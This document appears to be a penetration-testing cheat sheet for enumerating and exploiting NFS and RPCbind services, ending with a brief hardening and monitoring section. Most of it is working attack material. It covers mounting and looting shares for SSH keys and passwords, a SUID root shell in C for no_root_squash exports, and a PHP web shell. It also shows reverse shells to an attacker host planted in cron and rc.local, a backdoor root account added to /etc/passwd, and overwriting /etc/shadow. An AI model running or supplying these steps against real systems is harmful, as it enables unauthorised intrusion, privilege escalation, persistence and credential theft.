# NFS ENUMERATION (Port 111/2049)

## PORT OVERVIEW
```
Port 111   - RPCbind/Portmapper (TCP/UDP)
Port 2049  - NFS (TCP/UDP)
Port 20048 - mountd (dynamically assigned)
Port 4045  - nlockmgr (dynamically assigned)

Additional dynamic ports for:
- mountd
- statd
- nlockmgr
- quotad
```

## NFS BASICS
```
NFS = Network File System
- Allows remote file system mounting
- Unix/Linux file sharing protocol (like SMB for Windows)
- Requires RPCbind (port 111) to coordinate services
- NFS versions: NFSv2, NFSv3, NFSv4
- Common misconfigurations lead to full system access
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p111,2049 <IP>                        # Service/Version detection
nmap -sV -p111,2049 --script rpcinfo <IP>       # RPC information
rpcinfo -p <IP>                                 # List RPC services
rpcinfo -s <IP>                                 # List RPC services (alternative)
```

## NMAP NFS ENUMERATION
```bash
nmap --script "nfs-*" -p111,2049 <IP>           # All NFS scripts
nmap --script nfs-ls -p2049 <IP>                # List NFS shares (NFSv3)
nmap --script nfs-showmount -p111 <IP>          # Show mounted shares
nmap --script nfs-statfs -p2049 <IP>            # NFS statistics
nmap --script rpcinfo -p111 <IP>                # RPC program information
```

## RPCBIND ENUMERATION
```bash
# RPCbind/Portmapper (port 111) coordinates RPC services
# Must enumerate this first to find NFS

# rpcinfo - Query RPC services
rpcinfo -p <IP>                                 # List all RPC services
rpcinfo -s <IP>                                 # Summary of RPC services
rpcinfo -T tcp <IP> nfs                         # Query NFS via TCP
rpcinfo -T udp <IP> nfs                         # Query NFS via UDP

# Look for in rpcinfo output:
# - nfs (NFS service)
# - mountd (Mount daemon)
# - nlockmgr (Network Lock Manager)
# - status (NSM Status Monitor)

# Example output:
#    100003    3   tcp   2049  nfs
#    100005    3   tcp  20048  mountd
```

## NFS SHARE ENUMERATION
```bash
# showmount - Display NFS shares
showmount -e <IP>                               # Show exports (shared directories)
showmount -a <IP>                               # Show mounted shares
showmount -d <IP>                               # Show directories

# Example output:
# Export list for <IP>:
# /home         *
# /var/nfs      192.168.1.0/24
# /backup       (everyone)

# Nmap
nmap --script nfs-showmount -p111 <IP>

# Check NFS version
nfs-ls --version                                # Check installed version
rpcinfo -p <IP> | grep nfs                      # NFS version from server
```

## MOUNT NFS SHARES
```bash
# Mount NFS share on attacker machine

# Create mount point
mkdir /mnt/nfs

# Mount NFS share
mount -t nfs <IP>:/<SHARE> /mnt/nfs             # Mount share
mount -t nfs <IP>:/home /mnt/nfs                # Example: /home share
mount -t nfs -o nolock <IP>:/<SHARE> /mnt/nfs   # Disable locking
mount -t nfs -o vers=3 <IP>:/<SHARE> /mnt/nfs   # Specify NFSv3

# Mount with specific NFS version
mount -t nfs -o vers=2 <IP>:/<SHARE> /mnt/nfs   # NFSv2
mount -t nfs -o vers=3 <IP>:/<SHARE> /mnt/nfs   # NFSv3
mount -t nfs -o vers=4 <IP>:/<SHARE> /mnt/nfs   # NFSv4

# Mount all available shares
for share in $(showmount -e <IP> | grep -v "Export" | awk '{print $1}'); do
  mkdir -p /mnt/nfs$share
  mount -t nfs <IP>:$share /mnt/nfs$share
  echo "[+] Mounted: $share at /mnt/nfs$share"
done
```

## ACCESS MOUNTED SHARE
```bash
# After mounting, access like local directory

# List contents
ls -la /mnt/nfs/
tree /mnt/nfs/                                  # Recursive listing

# Search for sensitive files
find /mnt/nfs/ -name "*.conf" 2>/dev/null
find /mnt/nfs/ -name "*.sql" 2>/dev/null
find /mnt/nfs/ -name "id_rsa" 2>/dev/null
find /mnt/nfs/ -name "*.key" 2>/dev/null
find /mnt/nfs/ -name "*.sh" 2>/dev/null

# Search for passwords
grep -r -i "password" /mnt/nfs/ 2>/dev/null
grep -r -i "api.key" /mnt/nfs/ 2>/dev/null

# Copy files
cp /mnt/nfs/etc/passwd /tmp/
cp -r /mnt/nfs/home/user/.ssh /tmp/
```

## PRIVILEGE ESCALATION (NO_ROOT_SQUASH)
```bash
# no_root_squash = Root on client = Root on server
# This is a CRITICAL misconfiguration!

# Check if no_root_squash is enabled
showmount -e <IP>
cat /etc/exports                                # On target (if accessible)
# Look for: /share *(rw,no_root_squash)

# Exploitation steps:

# 1. Mount the share
mkdir /mnt/nfs
mount -t nfs <IP>:/<SHARE> /mnt/nfs

# 2. Check current user
whoami                                          # Should be root on attacker machine
id                                              # UID=0 (root)

# 3. Create SUID binary
# On attacker machine (as root):
cat > /tmp/shell.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
int main(void) {
  setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}
EOF

gcc /tmp/shell.c -o /mnt/nfs/shell              # Compile on mounted share
chmod +s /mnt/nfs/shell                         # Set SUID bit (as root)
chmod 4777 /mnt/nfs/shell                       # Ensure executable

# 4. Execute on target
# SSH/other access to target machine:
/path/to/nfs/mount/shell                        # Executes as root!
whoami                                          # root

# Alternative: Add to /etc/passwd
# If /etc is writable via NFS
echo 'backdoor:$1$xyz$abc123:0:0:root:/root:/bin/bash' >> /mnt/nfs/etc/passwd
```

## UID/GID MANIPULATION
```bash
# NFS uses UID/GID for permissions
# Can create user with target UID to bypass permissions

# 1. Find target UID
ls -lan /mnt/nfs/                               # Check file ownership
# Example: drwx------ 2 1000 1000

# 2. Create user with matching UID on attacker machine
useradd -u 1000 tempuser                        # Create user with UID 1000
su - tempuser                                   # Switch to that user

# 3. Now have same permissions as UID 1000 on target
cd /mnt/nfs/
ls -la                                          # Can now read files owned by UID 1000

# 4. Read/modify files
cat /mnt/nfs/home/user/.ssh/id_rsa              # Read SSH key
echo "ssh-rsa ..." >> /mnt/nfs/home/user/.ssh/authorized_keys  # Add SSH key
```

## UPLOAD FILES TO NFS
```bash
# If NFS share is writable

# Upload web shell (if web root is shared)
echo '<?php system($_GET["cmd"]); ?>' > /mnt/nfs/var/www/html/shell.php
# Access: http://<IP>/shell.php?cmd=whoami

# Upload SSH key
mkdir -p /mnt/nfs/home/user/.ssh
echo "ssh-rsa AAAAB3... attacker@kali" >> /mnt/nfs/home/user/.ssh/authorized_keys
chmod 600 /mnt/nfs/home/user/.ssh/authorized_keys
ssh user@<IP>                                   # SSH with uploaded key

# Upload cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'" > /mnt/nfs/etc/cron.d/backdoor

# Upload reverse shell script
cat > /mnt/nfs/tmp/shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1
EOF
chmod +x /mnt/nfs/tmp/shell.sh
# Execute via SSH or other access
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/nfs/nfsmount              # Enumerate NFS shares
use auxiliary/scanner/misc/sunrpc_portmapper    # RPC portmapper scan

# Example: NFS mount enumeration
set RHOSTS <IP>
run
```

## NFS VERSION DIFFERENCES
```bash
# NFSv2 (legacy)
# - Stateless
# - UDP only
# - 32-bit file sizes (2GB limit)

# NFSv3 (common)
# - Stateless
# - TCP and UDP
# - 64-bit file sizes
# - Better performance

# NFSv4 (modern)
# - Stateful
# - TCP only
# - Integrated security (Kerberos)
# - Better firewall friendly (single port)
# - No mountd/statd required

# Check NFS version
nfsstat -m                                      # On client after mount
rpcinfo -p <IP> | grep nfs                      # From rpcinfo
```

## NFS CONFIGURATION FILES
```bash
# /etc/exports - NFS export configuration
# Example:
/home         *(rw,sync,no_root_squash)         # DANGEROUS!
/var/nfs      192.168.1.0/24(rw,sync)           # Network restricted
/backup       *(ro)                             # Read-only for everyone

# Export options:
# rw = read-write
# ro = read-only
# sync = synchronous writes
# async = asynchronous writes
# no_root_squash = root on client = root on server (DANGEROUS!)
# root_squash = root on client mapped to nobody (default, safer)
# all_squash = all users mapped to nobody
# anonuid/anongid = specify UID/GID for anonymous access

# If you can read /etc/exports via NFS
cat /mnt/nfs/etc/exports                        # Check NFS configuration
```

## UNMOUNT NFS SHARES
```bash
# Unmount when done
umount /mnt/nfs                                 # Unmount share
umount -f /mnt/nfs                              # Force unmount
umount -l /mnt/nfs                              # Lazy unmount

# Unmount all NFS mounts
umount -a -t nfs

# Check mounted shares
mount | grep nfs                                # List NFS mounts
df -h | grep nfs                                # Show NFS disk usage
```

## NFS ENUMERATION SCRIPT
```bash
# Automated NFS enumeration
cat > nfs_enum.sh <<'EOF'
#!/bin/bash
IP=$1

echo "[*] NFS Enumeration: $IP"

echo "[*] RPC Services:"
rpcinfo -p $IP

echo "[*] NFS Shares:"
showmount -e $IP

echo "[*] Mounting all shares:"
for share in $(showmount -e $IP | grep -v "Export" | awk '{print $1}'); do
  mkdir -p /mnt/nfs_$IP$share
  mount -t nfs -o nolock $IP:$share /mnt/nfs_$IP$share 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "[+] Mounted: $share at /mnt/nfs_$IP$share"
    ls -la /mnt/nfs_$IP$share
  fi
done
EOF
chmod +x nfs_enum.sh
./nfs_enum.sh <IP>
```

## COMMON MISCONFIGURATIONS
```
☐ NFS shares exported to * (everyone)
☐ no_root_squash enabled (root access!)
☐ Writable shares with no authentication
☐ Sensitive directories exported (/home, /root, /etc)
☐ Web directories exported (upload web shell)
☐ No IP restrictions (any host can mount)
☐ NFSv3 with no authentication
☐ Weak file permissions on mounted shares
☐ SSH directories accessible (.ssh/authorized_keys)
☐ Old NFS version with known vulnerabilities
```

## QUICK WIN CHECKLIST
```
☐ Enumerate RPC services (rpcinfo)
☐ List NFS shares (showmount -e)
☐ Mount all accessible shares
☐ Check for no_root_squash (cat /etc/exports)
☐ Search for sensitive files (SSH keys, configs, backups)
☐ Check if shares are writable
☐ Test UID/GID manipulation
☐ If no_root_squash → Create SUID shell
☐ If writable web dir → Upload web shell
☐ If writable SSH dir → Upload authorized_keys
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick NFS enumeration
nmap -sV -p111,2049 --script nfs-* <IP>
showmount -e <IP>
rpcinfo -p <IP>

# Mount and enumerate all shares
for share in $(showmount -e <IP> | grep "/" | awk '{print $1}'); do
  mkdir -p /mnt/nfs$share
  mount -t nfs <IP>:$share /mnt/nfs$share && ls -laR /mnt/nfs$share
done
```

## ADVANCED TECHNIQUES
```bash
# NFS null export (no restrictions)
# Shares exported to * with no_root_squash
# Complete system compromise

# Create backdoor user in /etc/passwd
echo 'backdoor:$6$salt$hash:0:0:root:/root:/bin/bash' >> /mnt/nfs/etc/passwd

# Modify /etc/shadow (if accessible)
# Change root password
echo 'root:$6$newsalt$newhash:18000:0:99999:7:::' > /mnt/nfs/etc/shadow

# Hijack cron jobs
echo '* * * * * root /tmp/shell.sh' > /mnt/nfs/etc/cron.d/backdoor

# Modify SSH configuration
echo 'PermitRootLogin yes' >> /mnt/nfs/etc/ssh/sshd_config
echo 'PasswordAuthentication yes' >> /mnt/nfs/etc/ssh/sshd_config

# Plant persistence in startup scripts
echo 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' >> /mnt/nfs/etc/rc.local
```

## NFS OVER DIFFERENT NETWORKS
```bash
# NFS can be tunneled/forwarded

# SSH port forward
ssh -L 2049:localhost:2049 user@<IP>            # Forward NFS port
mount -t nfs localhost:/<SHARE> /mnt/nfs        # Mount via localhost

# Proxy NFS through compromised host
# If target NFS only accessible from internal network
# Use SSH tunnel or VPN to access
```

## POST-EXPLOITATION (AFTER NFS ACCESS)
```bash
# After gaining NFS access:
1. Enumerate all exported shares (showmount -e)
2. Mount all accessible shares
3. Check /etc/exports for no_root_squash
4. Search for sensitive files:
   - /etc/passwd, /etc/shadow
   - /home/*/.ssh/id_rsa, authorized_keys
   - /root/.ssh/
   - /var/www/html/ (web files)
   - /var/backups/
   - Configuration files (.conf, .ini, .xml)
   - Database dumps (.sql)
5. Test for write access (touch test.txt)
6. If no_root_squash → Create SUID binary for root
7. If writable → Upload web shell, SSH key, cron job
8. Use UID/GID manipulation to access user files
9. Modify system files if accessible
10. Create persistence mechanisms

# Full data extraction
mkdir /tmp/nfs_loot
for share in $(showmount -e <IP> | grep "/" | awk '{print $1}'); do
  echo "[*] Copying: $share"
  mkdir -p /tmp/nfs_loot$share
  mount -t nfs <IP>:$share /mnt/nfs
  cp -r /mnt/nfs/* /tmp/nfs_loot$share/
  umount /mnt/nfs
done

# Search for credentials
grep -r -i "password" /tmp/nfs_loot/
find /tmp/nfs_loot/ -name "id_rsa" -o -name "*.pem" -o -name "*.key"
find /tmp/nfs_loot/ -name "*.sql" -exec grep -i "insert" {} \;
```

## NFS SECURITY HARDENING (DEFENSE)
```bash
# Secure NFS configuration (/etc/exports)

# Use root_squash (default, safer)
/share 192.168.1.0/24(rw,sync,root_squash)      # Root mapped to nobody

# Restrict by IP/network
/share 192.168.1.10(rw,sync)                    # Single IP
/share 192.168.1.0/24(rw,sync)                  # Network

# Read-only exports (safer)
/share *(ro)                                    # Read-only for everyone

# Use all_squash (most restrictive)
/share *(rw,sync,all_squash,anonuid=1000,anongid=1000)

# NFSv4 with Kerberos authentication
/share gss/krb5(rw,sync)                        # Kerberos security

# Firewall rules
# Allow NFS only from trusted networks
iptables -A INPUT -p tcp --dport 2049 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 2049 -j DROP
iptables -A INPUT -p tcp --dport 111 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 111 -j DROP

# Disable NFSv2 and NFSv3 (use NFSv4 only)
# Edit /etc/nfs.conf
[nfsd]
vers2=n
vers3=n
vers4=y

# Monitor NFS access
# Check mounted clients
showmount -a                                    # Show all mounts
cat /proc/net/rpc/nfsd.export/content           # Export cache
cat /proc/fs/nfsd/clients                       # Connected clients
```

## NFS VULNERABILITIES
```bash
# Known NFS vulnerabilities

# CVE-2019-10149 - Exim + NFS
# If Exim MTA uses NFS for mail storage

# NFS race conditions
# Multiple clients accessing same file simultaneously

# NFSv3 authentication bypass
# Spoofed RPC credentials

# Search for exploits
searchsploit nfs
```

## TROUBLESHOOTING NFS
```bash
# Common NFS issues

# Mount fails
mount -t nfs -o nolock <IP>:/<SHARE> /mnt/nfs   # Try without locking
mount -t nfs -o vers=3 <IP>:/<SHARE> /mnt/nfs   # Specify version

# Permission denied after mount
# Check UID/GID matching
ls -lan /mnt/nfs/                               # Check numeric UIDs
useradd -u <UID> tempuser                       # Create matching user

# Stale NFS handle
umount -f /mnt/nfs                              # Force unmount
umount -l /mnt/nfs                              # Lazy unmount

# RPC timeout
# Increase timeout
mount -t nfs -o timeo=600 <IP>:/<SHARE> /mnt/nfs
```

## NFS MONITORING
```bash
# Monitor NFS for security

# Check NFS statistics
nfsstat                                         # NFS statistics
nfsstat -m                                      # Mounted shares
nfsstat -s                                      # Server statistics

# Monitor active mounts
showmount -a                                    # Show mounted clients
cat /var/lib/nfs/etab                           # Export table

# Check NFS logs
tail -f /var/log/syslog | grep nfs              # NFS logs (Debian/Ubuntu)
tail -f /var/log/messages | grep nfs            # NFS logs (RedHat/CentOS)

# Alert on suspicious activity:
# - Mounts from unexpected IPs
# - High volume of file access
# - Access to sensitive directories
# - Failed mount attempts
# - Root access (if no_root_squash disabled)
```
